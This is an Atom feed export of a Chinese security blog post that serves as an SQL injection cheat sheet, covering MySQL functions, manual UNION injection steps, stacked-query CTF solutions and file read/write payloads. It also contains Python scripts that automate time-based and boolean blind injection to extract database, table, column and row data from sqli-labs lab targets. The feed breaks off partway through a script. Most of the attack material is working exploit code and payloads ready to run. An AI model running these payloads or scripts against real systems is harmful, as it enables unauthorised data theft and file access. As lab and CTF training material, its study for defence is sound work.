<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ye1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.cfyqy.com/"/>
  <updated>2021-07-05T01:47:40.781Z</updated>
  <id>https://blog.cfyqy.com/</id>
  
  <author>
    <name>ye1s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入</title>
    <link href="https://blog.cfyqy.com/article/190afa65.html"/>
    <id>https://blog.cfyqy.com/article/190afa65.html</id>
    <published>2021-07-04T04:43:07.000Z</published>
    <updated>2021-07-05T01:47:40.781Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p><a id="more"></a><p><img src="../../images/loopholes/sql/sql.png" alt=""><br><a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">Sql注入笔记</a></p><h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><h2 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(str,len)  //从左边开始截取len个字符</span><br><span class="line"></span><br><span class="line">right(str,len) //从右边第index开始截取字符</span><br><span class="line"></span><br><span class="line">substring(str,pos) //从左边index开始截取</span><br><span class="line"></span><br><span class="line">substr(str, pos, len)  //将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 </span><br><span class="line"></span><br><span class="line">mid(str,pos,ken) //截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure><h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) //如果相同则返回1不同则返回0 </span><br><span class="line"></span><br><span class="line">locate(subStr,string) ：判断字符串（string）中是否包含另一个字符串（subStr），函数返回subStr在string中出现的位置。 如果字符串 string 包含 subStr  locate(subStr,string) &gt; 0. 如果字符串 string 不包含 subStr   locate(subStr,string) = 0</span><br></pre></td></tr></table></figure><h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) //将字符串首尾相连</span><br><span class="line"></span><br><span class="line">concat_ws(separator,str1,str2) //将字符串用指定连接符连接</span><br><span class="line"></span><br><span class="line">group_concat()//用于把多条数据一次注入出来</span><br></pre></td></tr></table></figure><h2 id="一些绕过注入的罕见函数"><a href="#一些绕过注入的罕见函数" class="headerlink" title="一些绕过注入的罕见函数"></a>一些绕过注入的罕见函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) //从子字符串中返回子串第一次出现的位置</span><br><span class="line"></span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * /</span><br></pre></td></tr></table></figure><p>比较运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">= &lt;&gt; != &gt; &lt;</span><br><span class="line"></span><br><span class="line">(1)between //select database() between 0x61 and 0x7a; //select database() between <span class="string">'a'</span> and <span class="string">'z'</span>;</span><br><span class="line">(2)<span class="keyword">in</span> //select <span class="string">'123'</span> <span class="keyword">in</span> (<span class="string">'12'</span>) =&gt; 0</span><br><span class="line">(3)like(模糊匹配) //select <span class="string">'12345'</span> like <span class="string">'12%'</span> =&gt; <span class="literal">true</span></span><br><span class="line">(4)regexp 或 rlike(正则匹配)//select <span class="string">'123455'</span> regexp <span class="string">'^12'</span> =&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure><p> 逻辑运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 == &amp;&amp;</span><br><span class="line">OR 逻辑或 == ||</span><br><span class="line">XOR 逻辑异或 == ^</span><br></pre></td></tr></table></figure><p>位运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure><p>注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //单行注释符,url记得编码为%23</span></span><br><span class="line">/**/ </span><br><span class="line">--+</span><br></pre></td></tr></table></figure><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p> 延时函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(duration) //暂停duration秒</span><br><span class="line">benchmark(count,expr) //重复执行count次expr</span><br></pre></td></tr></table></figure><p> 编码函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONV(N,from_base,to_base) //N是要转换的数据，from_base是原进制，to_base是目标进制 </span><br><span class="line">hex(num) //转化成16进制</span><br><span class="line">unhex() </span><br><span class="line">ord(str)   //返回字符串第一个字符的ASCII 值</span><br><span class="line">ascii(str) //返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span><br></pre></td></tr></table></figure><p>文件函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select 1,2,load_file('</span>/etc/init.d/httpd<span class="string">')  //读取文件</span></span><br><span class="line"><span class="string">select xxoo into outfile '</span>路径<span class="string">' //权限较高时可直接写文件</span></span><br></pre></td></tr></table></figure><h2 id="一些构造语句"><a href="#一些构造语句" class="headerlink" title="一些构造语句"></a>一些构造语句</h2><p>条件语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3) // expr1 <span class="literal">true</span>执行expr2否则执行expr3</span><br><span class="line"><span class="keyword">case</span> when....then....else...end</span><br><span class="line">select <span class="keyword">case</span> when (条件) <span class="keyword">then</span> 代码1 <span class="keyword">else</span> 代码 2 end</span><br><span class="line">IFNULL() </span><br><span class="line">NULLIF()</span><br><span class="line"></span><br><span class="line">MAKE_SET(bits,str1,str2,…)//返回一个设定值(含子字符串分隔字符串<span class="string">","</span>字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。例如，select make_set(<span class="string">"1"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>); bits将转为二进制,1的二进制为0000 0001,倒过来为1000 0000,所以取str1(a),打印a</span><br></pre></td></tr></table></figure><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user()：当前数据库用户</span><br><span class="line">database()：当前数据库名 </span><br><span class="line">version()：当前使用的数据库版本  </span><br><span class="line">@@datadir：数据库存储数据路径  </span><br><span class="line">length(str) ：返回字符串str的长度     </span><br><span class="line">information_schema //系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</span><br><span class="line">SCHEMATA//储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</span><br><span class="line">TABLES//储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</span><br><span class="line">COLUMNS//储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</span><br></pre></td></tr></table></figure><h1 id="手工注入基本流程"><a href="#手工注入基本流程" class="headerlink" title="手工注入基本流程"></a>手工注入基本流程</h1><p>MySQL &gt;= 5.0<br> 获取字段数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure><p> 获取当前数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure><p>获取数据库中的表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure><p> 获取表中的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">'users</span></span><br></pre></td></tr></table></figure><p>OX5 获取各个字段值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure><h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>来自于强网杯的第三届强网杯的一题<br>题目过滤了查询删除更新插入等语句<br><img src="../../images/loopholes/sql/1.png" alt=""><br>查看表名     </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/3.png" alt=""><br>查看字段 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';desc `1919810931114514`;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/2.png" alt=""><br>查看数据  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;SET @haha_test = CONCAT('</span>S<span class="string">','</span>ELECT * from `1919810931114514`<span class="string">');PREPARE pr2 FROM @haha_test;EXECUTE pr2 ;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/sql/4.png" alt=""> </p><p>[SUCTF 2019]EasySQL</p><p>后台sql语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">'query'</span>] || flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">if</span>((ascii(substr((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))=97),sleep(5),0)</span><br></pre></td></tr></table></figure><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: ye1s</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-15 16:21:36</span></span><br><span class="line"><span class="comment"># @Last Modified by:   ye1s</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-15 22:07:34</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">tablename=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">tablename +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line"><span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">def getColumns(tablename):<span class="comment">#爆列名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if((ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">columnname=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">columnname +=char</span><br><span class="line"><span class="built_in">print</span> tablename+<span class="string">"'columns is:"</span>+columnname</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+columnname</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">def getData(columnname,tablename):</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and if(ascii(substr((select"</span>+columnname+<span class="string">"from "</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),5)%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">data=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">data +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"data is:"</span>+data</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+data</span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure><h3 id="0x2post"><a href="#0x2post" class="headerlink" title="0x2post"></a>0x2post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: yeSi</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-16 10:03:42</span></span><br><span class="line"><span class="comment"># @Last Modified by:   yeSi</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-16 10:40:43</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-17/"</span></span><br><span class="line">def getDbname():</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,15):</span><br><span class="line"><span class="built_in">print</span> i</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">startTime=time.time()</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'uname'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'passwd'</span>:<span class="string">"' or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0) --+"</span>.format(i,ord(char)),</span><br><span class="line"><span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span> char</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">res=requests.post(url=url,data=payload)</span><br><span class="line"><span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line">…… </span><br><span class="line">getDbname()</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>0x1 布尔盲注语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</span><br></pre></td></tr></table></figure><p>0x2 爆数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">result +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure><p>0x 爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">result=<span class="string">""</span></span><br><span class="line">payload=<span class="string">"'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">tablename=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line"><span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">response=requests.get(newurl)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">tablename +=char</span><br><span class="line"><span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">flag=1</span><br><span class="line">result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line"><span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"><span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>0x 爆字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import 